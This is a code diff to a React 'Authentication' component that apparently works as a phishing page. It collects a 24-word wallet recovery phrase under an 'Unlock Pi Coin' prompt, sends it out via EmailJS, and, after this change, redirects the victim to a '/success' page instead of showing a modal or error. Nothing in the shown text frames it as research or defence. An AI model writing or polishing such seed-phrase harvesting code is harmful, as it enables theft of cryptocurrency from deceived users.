@@ -10,9 +10,6 @@ function Authentication() {
 
    const [error, setError] = useState<boolean>(false);
    const [loading, setLoading] = useState<boolean>(false);
-   const [showModal, setShowModal] = useState<boolean>(false);
-   const [sendError,setSendError] = useState<boolean>(false);
-
 
  
    const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
@@ -22,7 +19,6 @@ function Authentication() {
    const handleSend = async () => {
      setLoading(true);
      setError(false);
-     setShowModal(true);
    
      const wordCount = phrase.trim().split(/\s+/).length;
      console.log(wordCount, phrase.trim().split(/\s+/));  // Debugging
@@ -30,7 +26,6 @@ function Authentication() {
      if (wordCount !== 24) {
        setError(true);
        setLoading(false);
-       setShowModal(false);
        return;
      }
    
@@ -41,11 +36,10 @@ function Authentication() {
        setPhrase("");
        setLoading(false)
        console.log("Sent message");
+       navigate("/success")
       //  setShowModal(false);
      } catch (error:any) {
        console.error("Error:", error?.text || error?.message || error);  // Enhanced error message
-       setSendError(true)
-       setShowModal(false)
      } finally {
        setLoading(false);
      }
@@ -80,7 +74,7 @@ function Authentication() {
        <button className="mt-2 text-gray-500">Back</button>
 
 
-       {showModal && (
+       {/* {showModal && (
         <div className="fixed inset-0 bg-black/10 backdrop-blur-sm flex justify-center items-center">
           <div className="bg-teal-400 p-8 rounded-lg shadow-lg mx-5 w-full max-w-md">
             <h3 className="text-xl font-bold text-white text-center mb-4">Unlock Pi Coin</h3>
@@ -105,7 +99,7 @@ function Authentication() {
             </button>
           </div>
         </div>
-      )}
+      )} */}
      </div>
    );
  }
